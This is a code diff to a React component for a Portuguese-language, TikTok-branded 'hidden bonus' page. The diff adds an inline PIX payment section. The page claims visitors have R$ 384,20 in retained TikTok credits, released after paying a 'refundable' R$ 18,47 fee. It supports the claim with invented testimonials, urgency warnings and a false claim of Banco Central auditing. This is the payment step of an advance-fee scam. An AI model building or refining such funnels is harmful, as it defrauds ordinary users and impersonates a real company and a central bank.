@@ -1,18 +1,21 @@
 import { useState } from "react";
 import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellBonusOcultoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellBonusOcultoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
 const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);
 
-const FunnelUpsellBonusOculto = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellBonusOcultoProps) => {
+const FunnelUpsellBonusOculto = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellBonusOcultoProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#FE2C55] py-3 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
@@ -27,11 +30,16 @@ const FunnelUpsellBonusOculto = ({ balance, onGeneratePix, isGenerating, leadCpf
           <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
           <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">9.432 pessoas</span> já liberaram o bônus oculto nos últimos 7 dias.</p>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 18,47" label="Bônus Oculto" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#FE2C55" />
+        )}
+
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="O que é o bônus oculto?" answer="São créditos de campanhas anteriores do TikTok que ficaram retidos no módulo de conciliação." /><FaqItem question="Por que preciso pagar R$ 18,47?" answer="A taxa cobre o custo operacional da conciliação bancária. É 100% reembolsável em até 2 minutos." /><FaqItem question="Esse valor será somado ao meu saldo?" answer="Sim! Os R$ 384,20 serão adicionados diretamente ao seu saldo principal." /><FaqItem question="E se eu não liberar agora?" answer="O bônus oculto tem prazo de resgate limitado. Se não for liberado durante esta sessão, pode não estar disponível na próxima consulta." /></div></div>
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem liberou, recebeu</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Mariana S." location="Recife, PE" text="Nem sabia que tinha esse bônus! Paguei a taxa e em menos de 1 minuto caiu tudo junto no meu PIX." amount="R$ 384,20" /><TestimonialCard img={testimonial2} name="Carlos A." location="Belo Horizonte, MG" text="Fiquei desconfiado no começo, mas a taxa voltou rapidinho e o bônus caiu junto com o saldo." amount="R$ 384,20" /><TestimonialCard img={testimonial3} name="Juliana R." location="Curitiba, PR" text="Já tinha feito o saque e apareceu esse bônus extra. Liberei na hora e recebi tudo certinho." amount="R$ 384,20" /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de conciliação auditado pelo Banco Central</p></div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="LIBERAR BÔNUS DE R$ 384,20" bgColor="bg-[#FE2C55]" shadowColor="shadow-red-200" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="LIBERAR BÔNUS DE R$ 384,20" bgColor="bg-[#FE2C55]" shadowColor="shadow-red-200" />}
     </div>
   );
 };
